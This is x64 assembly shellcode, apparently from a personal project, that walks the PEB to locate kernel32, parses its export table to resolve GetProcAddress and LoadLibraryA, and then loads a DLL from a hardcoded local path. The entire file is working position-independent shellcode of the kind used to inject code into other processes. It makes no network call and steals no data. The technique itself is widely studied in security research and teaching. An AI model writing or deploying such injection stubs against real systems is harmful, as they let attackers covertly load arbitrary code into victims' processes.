BITS 64
SECTION .text
global main
main:

    mov rax, rsp
    and rsp, 0xffffffffffffff00 ; Align the stack to a multiple of 16 bytes
    add rsp, 8
    push rax

    call get_rip

get_rip:
    pop r15

; Parse PEB and find kern el32
    xor rcx, rcx             ; RCX = 0
    mov rax, [gs:rcx + 0x60] ; RAX = PEB
    mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
    mov rsi, [rax + 0x20]    ; RSI = PEB->Ldr.InMemOrder
    lodsq                    ; RAX = Second module
    xchg rax, rsi            ; RAX = RSI, RSI = RAX
    lodsq                    ; RAX = Third(kernel32)
    mov rbx, [rax + 0x20]    ; RBX = Base address

; Parse kernel32 PE
    xor r8, r8                 ; Clear r8
    mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
    mov rdx, r8                ; RDX = DOS->e_lfanew
    add rdx, rbx               ; RDX = PE Header
    mov r8d, [rdx + 0x88]      ; R8D = Offset export table
    add r8, rbx                ; R8 = Export table
    xor rsi, rsi               ; Clear RSI
    mov esi, [r8 + 0x20]       ; RSI = Offset namestable
    add rsi, rbx               ; RSI = Names table
    xor rcx, rcx               ; RCX = 0
    mov r9, 0x41636f7250746547 ; GetProcA
    
    
Get_Function:

; Loop through exported functions and find GetProcAddress
    
    inc rcx                    ; Increment the ordinal
    xor rax, rax               ; RAX = 0
    mov eax, [rsi + rcx * 4]   ; Get name offset
    add rax, rbx               ; Get function name
    cmp QWORD [rax], r9        ; GetProcA ?
    jnz Get_Function
    xor rsi, rsi               ; RSI = 0
    mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
    add rsi, rbx               ; RSI = Ordinals table
    mov cx, [rsi + rcx * 2]    ; Number of function
    xor rsi, rsi               ; RSI = 0
    mov esi, [r8 + 0x1c]       ; Offset address table
    add rsi, rbx               ; ESI = Address table
    xor rdx, rdx               ; RDX = 0
    mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
    add rdx, rbx               ; RDX = GetProcAddress
    mov rdi, rdx               ; Save GetProcAddress in RDI

; Use GetProcAddress to find the address of LoadLibrary

    mov rcx, 0x41797261          ; aryA
    push rcx                     ; Push on the stack
    mov rcx, 0x7262694c64616f4c  ; LoadLibr
    push rcx                     ; Push on stack
    mov rdx, rsp                 ; LoadLibraryA
    mov rcx, rbx                 ; kernel32.dll base address
    sub rsp, 0x30                ; Allocate stack space for function call
    call rdi                     ; Call GetProcAddress
    add rsp, 0x30                ; Cleanup allocated stack space
    add rsp, 0x10                ; Clean space for LoadLibrary string
    mov rsi, rax                 ; LoadLibrary saved in RSI

; Call LoadLibrary

   sub rsp, 0x30
   lea rcx, [r15 + file_path - get_rip]
   call rsi
   add rsp, 0x30
   jmp end

file_path:
    db "C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Release\\SubZeroDLL.dll", 0
    
end:
    pop rsp
    ret